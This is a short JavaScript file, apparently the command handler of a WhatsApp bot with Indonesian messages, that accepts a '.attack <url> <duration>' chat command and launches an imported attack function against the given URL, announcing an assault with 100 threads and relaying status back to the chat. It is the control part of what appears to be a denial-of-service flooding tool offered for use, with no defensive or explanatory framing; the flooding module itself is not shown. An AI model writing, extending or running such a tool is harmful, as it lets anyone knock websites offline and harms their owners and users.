const { attack } = require('./attack');

async function handleCommand(sock, msg, pesan) {
    const from = msg.key.remoteJid;

    const args = pesan.trim().split(' ');
    const cmd = args[0].toLowerCase();

    if (cmd === '.attack') {
        if (args.length < 3) {
            await sock.sendMessage(from, { text: 'Format: .attack <url> <duration>' });
            return;
        }

        const url = args[1];
        const duration = parseInt(args[2]);

        await sock.sendMessage(from, { text: `🚀 Memulai serangan ke ${url} selama ${duration}s dengan 100 threads` });
        attack(url, duration, (status) => {
            sock.sendMessage(from, { text: status });
        });
    }
}

module.exports = { handleCommand };